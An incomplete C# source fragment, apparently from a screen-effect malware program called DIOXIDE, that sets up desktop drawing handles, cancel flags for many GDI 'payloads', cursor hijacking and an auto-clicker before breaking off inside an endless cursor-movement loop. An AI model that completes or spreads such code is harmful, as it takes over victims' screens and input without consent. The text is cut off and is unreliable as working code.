...
namespace DIOXIDE
{
    unsafe class payloads
    {
        public static IntPtr hwnd = GetDesktopWindow();
        public static IntPtr hdc = GetWindowDC(payloads.hwnd);

        public int gdi1_cancel = 0;
        public int gdi2_cancel = 0;
        public int gdi3_cancel = 0;
        public int gdi4_cancel = 0;
        public int gdi5_cancel = 0;
        public int gdi6_cancel = 0;
        public int gdi7_cancel = 0;
        public int gdi8_cancel = 0;
        public int gdi9_cancel = 0;
        public int gdi10_cancel = 0;
        public int gdi11_cancel = 0;
        public int gdi12_cancel = 0;
        public int gdi13_cancel = 0;
        public int gdi14_cancel = 0;
        public int gdi15_1_cancel = 0;
        public int gdi15_2_cancel = 0;
        public int gdi15_3_cancel = 0;
        public int gdi15_4_cancel = 0;
        public int gdi16_cancel = 0;
        public int gdi17_cancel = 0;
        public int gdi18_cancel = 0;
        public int gdi19_cancel = 0;
        public int gdi20_cancel = 0;
        public int gdi21_cancel = 0;
        public int cursor_movement_cancel = 0;
        public int Clicker_cancel = 0;
        public int drawCursor_cancel = 0;

        int x = Screen.PrimaryScreen.Bounds.Width;
        int y = Screen.PrimaryScreen.Bounds.Height;
        int x2 = Screen.PrimaryScreen.Bounds.Left;
        int y2 = Screen.PrimaryScreen.Bounds.Top;
        int xc = Screen.PrimaryScreen.Bounds.Right - Screen.PrimaryScreen.Bounds.Left;
        int yc = Screen.PrimaryScreen.Bounds.Bottom - Screen.PrimaryScreen.Bounds.Top;

        Random r = new Random();
        public void cursor_movement()
        {
            while (true)
            {
                Thread.Sleep(10);
